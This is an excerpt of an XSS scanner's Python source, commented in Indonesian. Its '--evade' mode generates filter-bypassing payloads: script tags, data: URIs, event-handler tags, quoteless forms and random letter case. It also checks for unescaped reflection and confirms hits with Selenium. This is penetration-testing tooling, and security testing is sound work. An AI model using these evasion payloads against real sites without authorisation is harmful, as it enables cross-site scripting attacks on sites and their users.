...
def show_help_syntax():
    ...
    print(f"{"--evade".ljust(WIDTH)}Enable advanced payload evasion techniques\n")
...
def generate_evasion_payloads(base_payload):
    """
    Membangkitkan variasi payload yang canggih dari satu payload dasar.
    Asumsi base_payload adalah sesuatu seperti `javascript:alert(1)`.
    """
    payloads = set()

    # Ekstrak konten JS, misal 'alert(1)'
    js_code = base_payload.replace('javascript:', '').strip()

    # 1. Variasi Tag dan Event Handler
    tags = {
        "svg": "onload",
        "img": "onerror",
        "body": "onpageshow",
        ...
        "audio": "onerror",
        "iframe": "onload",
        "script": "src"  # Kasus khusus
    }

    for tag, event in tags.items():
        if tag == "script":
            # Payload script klasik
            payloads.add(f"<script>{js_code}</script>")
            payloads.add(
                f"<script src=data:text/javascript,{js_code}></script>")
        else:
            # Payload berbasis event handler
            payloads.add(f'<{tag} {event}="{js_code}">')
            # Variasi tanpa kutip
            payloads.add(f'<{tag} {event}={js_code}>')
            # Variasi dengan karakter sampah
            payloads.add(f'<{tag}/{event}={js_code}>')

    # 2. Variasi Huruf (Case Variations)
    # Ambil beberapa payload yang sudah ada dan variasikan hurufnya
    sample_payloads = list(payloads)[:3]
    for p in sample_payloads:
        payloads.add("".join(random.choice([c.upper(), c.lower()]) for c in p))
...
/_/                                               
        ...
        try:
            ...
            if original_payload in response_text and not ("&lt;" in response_text or "&gt;" in response_text):
                ...
                if method.upper() == 'GET' and self.use_selenium and self.test_type == 'XSS':
                    if self.verbose:
                        print(
                            f"[{Fore.BLUE}VERIFYING{Style.RESET_ALL}] Potential GET finding in {param_name}. Launching Selenium...")
    ...
    async def run(self):
        ...
        async with aiohttp.ClientSession(connector=connector) as session:
            ...
            self._print_banner()
            # --- Logika Baru untuk Memilih Payload ---
            if self.evade and self.test_type == 'XSS':
                print("[*] Generating advanced evasion payloads...")
                payloads_to_use = []
                for p in self.base_payloads:
                    payloads_to_use.extend(generate_evasion_payloads(p))
                # Hapus duplikat
                payloads_to_use = list(set(payloads_to_use))
            else:
            ...
            if self.crawl:
                ...
                for url in self.targets:
                    # Perluasan untuk menguji GET dan FORM di mode list
                    tasks.append(self._test_get_url(
                        session, url, payloads_to_use))
                await asyncio.gather(*tasks)
